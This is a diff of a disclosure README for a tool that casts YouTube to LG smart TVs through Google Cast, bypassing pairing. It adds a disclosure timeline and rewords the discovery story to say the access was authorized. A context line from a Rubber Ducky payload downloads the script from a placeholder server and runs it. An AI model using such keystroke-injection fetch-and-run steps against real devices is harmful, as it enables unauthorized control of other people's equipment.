@@ -2,6 +2,8 @@
 
 **Cast YouTube videos to LG Smart TVs without on-screen pairing approval.**
 
+*Author: James Washington — security research / responsible disclosure.*
+
 LG webOS TVs require on-screen pairing via their WebSocket API (ports 3000/3001) before accepting remote commands. This tool bypasses that requirement entirely by using the TV's built-in Google Cast protocol (port 8009), which requires no pairing.
 
 ## The Vulnerability
@@ -57,7 +59,7 @@ python3 lg_cast.py rickroll 192.168.1.100
 
 ## How It Was Discovered
 
-While attempting to remotely manage TVs at a dance studio 900 miles away through an OpenVPN tunnel:
+While performing authorized remote management of Smart TVs at a client site over a VPN tunnel:
 
 1. The webOS WebSocket API (port 3001) returned `ms.channel.unauthorized` and was supposed to show an on-screen pairing prompt — but no prompt appeared on the TV
 2. A full port scan revealed ports 8008 and 8009 (Google Cast) were also open
@@ -67,7 +69,7 @@ While attempting to remotely manage TVs at a dance studio 900 miles away through
 6. Injecting `yt._screen_id` directly bypassed the normal discovery flow
 7. Full YouTube control achieved — video, playlists, volume, live streams
 
-The TV was then instructed to play a live feed of the 4 studios in a camera grid from an unlisted LIVE playlist I had previously built for the dance studio.
+With control established, the TV could be directed to play arbitrary YouTube content, including an unlisted live stream prepared for the client — all without any interaction at the TV itself.
 
 ## Flipper Zero / USB Rubber Ducky
 
@@ -103,7 +105,7 @@ STRING curl -sL https://your-server.com/lg_cast.py -o %TEMP%\lg.py && python %TE
 ENTER
 ```
 
-**Note:** Both require the attacking machine to be on the same network as the TV. This is a local network attack — not remote exploitable from the internet (unless you have VPN access to the network, like we did).
+**Note:** Both require the attacking machine to be on the same network as the TV. This is a local network attack — not remote exploitable from the internet (unless you have authorized VPN access to the network).
 
 ## Responsible Disclosure
 
@@ -119,10 +121,18 @@ This is not a zero-day in the traditional sense — it's a design inconsistency.
 
 **Mitigation:** Disable built-in Chromecast in TV settings, or use network segmentation (VLAN) to isolate Smart TVs.
 
+## Disclosure Timeline
+
+- **Late 2025** — Behavior reported privately to LG. LG acknowledged the report and stated they would follow up.
+- **Following ~11 months** — No follow-up, no remediation, and no further contact from LG.
+- **October 2026** — Public disclosure, after a good-faith vendor window with no vendor action. Findings published here with mitigations so affected owners can protect themselves.
+
+*(Exact report date on file with the author; approximate dates shown here.)*
+
 ## Credits
 
-Discovered by James Washington and **Amy 3.0** while working to resolve an immediate need prior to a dance competition at a dance studio in Shepherdsville, Kentucky from Pensacola, Florida via OpenVPN tunnel.
+Discovered by **James Washington** and **Amy 3.0** during an authorized remote-management engagement for a client site.
 
 ## License
 
-MIT — Do whatever you want with it. Just don't be mean about it.
+MIT — see [LICENSE](LICENSE). Provided for research and defensive purposes; respect the law and other people's networks.
